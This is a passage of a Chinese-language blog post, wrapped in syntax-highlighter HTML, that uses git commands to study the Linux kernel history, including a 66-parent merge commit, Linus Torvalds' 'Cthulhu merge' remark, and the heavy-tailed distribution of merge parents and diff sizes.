-->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcb5302006017\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ (git log --min-parents=2 --pretty='format:%h %P' |\r\n&gt;  ruby -ne '/^(w+) (.*)$/ =~ $_; puts \"#{$2.split.count} #{$1}\"' |\r\n&gt;  sort -n |\r\n&gt;  tail -1)\r\n66 2cde51f</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb5302006017-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb5302006017-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb5302006017-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb5302006017-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb5302006017-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb5302006017-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">min</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parents</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">pretty</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'format:%h %P'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb5302006017-2\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">ruby</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ne</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/^(w+) (.*)$/ =~ $_; puts \"#{$2.split.count} #{$1}\"'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb5302006017-3\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">sort</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb5302006017-4\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">tail</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb5302006017-5\"><span class=\"crayon-cn\">66</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2cde51f</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0216 seconds] -->\r\n<p>66 个父节点！这么多的父节点，这个提交到底发生了什么？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcb8176876432\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git log -1 2cde51f\r\ncommit 2cde51fbd0f310c8a2c5f977e665c0ac3945b46d\r\nMerge: 7471c5c c097d5f 74c375c 04c3a85 5095f55 4f53477\r\n2f54d2a 56d37d8 192043c f467a0f bbe5803 3990c51 d754fa9\r\n516ea4b 69ae848 25c1a63 f52c919 111bd7b aafa85e dd407a3\r\n71467e4 0f7f3d1 8778ac6 0406a40 308a0f3 2650bc4 8cb7a36\r\n323702b ef74940 3cec159 72aa62b 328089a 11db0da e1771bc\r\nf60e547 a010ff6 5e81543 58381da 626bcac 38136bd 06b2bd2\r\n8c5178f 8e6ad35 008ef94 f58c4fc4 2309d67 5c15371 b65ab73\r\n26090a8 9ea6fbc 2c48643 1769267 f3f9a60 f25cf34 3f30026\r\nfbbf7fe c3e8494 e40e0b5 50c9697 6358711 0112b62 a0a0591\r\nb888edb d44008b 9a199b8 784cbf8\r\nAuthor: Mark Brown &lt;[email redacted for privacy]&gt;\r\nDate:   Thu Jan 2 13:01:55 2014 +0000\r\n\r\n    Merge remote-tracking branches [65 remote branch names]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcb8176876432-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcb8176876432-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2cde51f</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-2\"><span class=\"crayon-i\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2cde51fbd0f310c8a2c5f977e665c0ac3945b46d</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-3\"><span class=\"crayon-v\">Merge</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7471c5c</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">c097d5f</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">74c375c</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">04c3a85</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5095f55</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4f53477</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-4\"><span class=\"crayon-cn\">2f54d2a</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">56d37d8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192043c</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">f467a0f </span><span class=\"crayon-i\">bbe5803</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3990c51</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">d754fa9</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-5\"><span class=\"crayon-cn\">516ea4b</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">69ae848</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25c1a63</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">f52c919</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">111bd7b</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">aafa85e </span><span class=\"crayon-i\">dd407a3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-6\"><span class=\"crayon-cn\">71467e4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0f7f3d1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8778ac6</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0406a40</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">308a0f3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2650bc4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8cb7a36</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-7\"><span class=\"crayon-cn\">323702b</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ef74940</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3cec159</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">72aa62b</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">328089a</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11db0da</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">e1771bc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-8\"><span class=\"crayon-e\">f60e547 </span><span class=\"crayon-i\">a010ff6</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5e81543</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">58381da</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">626bcac</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">38136bd</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">06b2bd2</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-9\"><span class=\"crayon-cn\">8c5178f</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8e6ad35</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">008ef94</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">f58c4fc4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2309d67</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5c15371</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">b65ab73</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-10\"><span class=\"crayon-cn\">26090a8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9ea6fbc</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2c48643</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1769267</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">f3f9a60 </span><span class=\"crayon-i\">f25cf34</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3f30026</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-11\"><span class=\"crayon-e\">fbbf7fe </span><span class=\"crayon-e\">c3e8494 </span><span class=\"crayon-i\">e40e0b5</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">50c9697</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6358711</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0112b62</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">a0a0591</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-12\"><span class=\"crayon-e\">b888edb </span><span class=\"crayon-i\">d44008b</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9a199b8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">784cbf8</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-13\"><span class=\"crayon-v\">Author</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Mark </span><span class=\"crayon-v\">Brown</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">email </span><span class=\"crayon-e\">redacted </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">privacy</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-14\"><span class=\"crayon-v\">Date</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">01</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">55</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2014</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">0000</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcb8176876432-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcb8176876432-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">Merge </span><span class=\"crayon-v\">remote</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">tracking </span><span class=\"crayon-i\">branches</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">65</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">remote </span><span class=\"crayon-e\">branch </span><span class=\"crayon-v\">names</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0302 seconds] -->\r\n<p>这让许多历史记录可视化工具都无法正常运行，引出了 Linus Torvalds 的一个<a href=\"http://marc.info/?l=linux-kernel&amp;m=139033182525831\">回应</a>:</p>\n<blockquote><p>我刚刚从 Takashi 那收到了一些消息，因此我看到了你的合并提交 2cde51fbd0f3 。这个提交有 66 个父节点。</p>\n<p>[…]</p>\n<p>它被拉取（pulled）了，并且状况良好，但显然它在 “章鱼式合并很好” 和 “上帝” 之间做到了平衡，这不是一个章鱼式合并，这是一个克苏鲁(一个章鱼头人神的巨人)式的合并。</p></blockquote>\n<p>正如我所看到的，这个有66个父节点的不同寻常的提交在某种程度上只是对于ASoc代码修改的正常合并。ASoc 代表了芯片上的ALSA系统。ALSA系统是音频子系统；“单片系统是集成在单片硅芯片上计算机的术语。综上所述，ASoc 是对嵌入式设备的声音支持系统。</p>\n<p>那么这样的合并多久会发生一次呢？永远都不会发生。规模排第二的合并是 fa623d1 ,它仅仅有 30 个父节点。然而，因为足够的背景知识，从 30 到 66 之间的巨大差距并不会令人感到惊讶。</p>\n<p>一次 git 提交的父节点的数量大概是一种单侧分布(通常非正式的说法是幂律分布，因为这里对这个不感兴趣，所以不必严格正确)。软件系统的许多属性都属于单侧分布。等一下；我将会生成一个图表来确定…(大量严格的图表确定了)。是的，它确实是单侧分布:</p>\n<p><img src=\"https://www.destroyallsoftware.com/images/blog/parents-per-commit-in-linux-kernel-log-log.svg\" alt=\"\"></p>\n<p>简单地说来, “单侧分布”意味着小事件比大事件多得多，而且大事件的最大规模是没有界限的。内核的提交历史中包含了 45,381 个两个父节点的合并，但仅仅有一个 66个父节点的合并。假如考虑足够多的开发历史记录的话，我们可能会看到多于66个父节点的合并。</p>\n<p>单个函数或是单个模块的代码行数也是单侧分布（大多数函数和模块都很小，但是其中一些很大；想想 web app 中的 “User” 类)。同样，对于模块的变化率（大多数模块都不会经常变动，只有其中一些会不断改动；再想想 “User” 类）。这些分布在软件开发中无处不在，而且经常在下面的双对数坐标图中呈直线分布。</p>\n<p>对于父节点的数量最大的提交，我们就讨论到这。那么在差异方面的合并又怎样呢？在差异方面，我的意思是被合并的两个分支之间的差异。我们可以通过简单地比较合并节点的父节点，然后统计它们差异的行数来衡量这一点。</p>\n<p>例如，如果一个分支一年前从 master 分支分离出去，改变了一行代码，之后被合并回 master 分支，在这段时间内对于 master 分支的所有修改都会被统计到，同样分离出去的分支上的改变也会被统计到。我们可以引出更直观的差异概念，但因为 git 不会保留分支的元数据，所以它们很难或者说是几乎不可能计算出来。</p>\n<p>在任何情况下，作为计算差异的起点，下面是最近内核合并的差异：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcbe125422230\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git diff $(git log --merges -1 --pretty='format:%P') | wc -l\r\n     173</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcbe125422230-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcbe125422230-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcbe125422230-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-i\">diff</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">merges</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">pretty</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'format:%P'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcbe125422230-2\"><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">173</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0379 seconds] -->\r\n<p>在英语中，这个命令的含义是这样的：“比较最近合并的两个父节点，然后统计差异的行数。”为了找出差异最多的合并，我们可以遍历每个合并提交，用类似的方法统计差异的行数。然后，作为一个测试，我们将搜索所有合并中恰好有 2,000 行差异的分支。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcc7428751038\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ (git log --merges --pretty=\"%h\" |\r\n   while read x; do\r\n     echo \"$(git diff $(git log --pretty=%P $x -1) | wc -l)\" $x\r\n   done &gt; merges.txt)\r\n$ sort -n merges.txt | grep 'b2000b'\r\n    2000 3d6ce33\r\n    2000 7fedd7e\r\n    2000 f33f6f0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcc7428751038-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcc7428751038-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcc7428751038-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcc7428751038-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcc7428751038-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcc7428751038-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcc7428751038-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcc7428751038-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcc7428751038-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">merges</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">pretty</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"%h\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcc7428751038-2\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">read</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcc7428751038-3\"><span class=\"crayon-h\">     </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$(git diff $(git log --pretty=%P $x -1) | wc -l)\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">x</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcc7428751038-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-v\">done</span><span class=\"crayon-h\"> </span><span 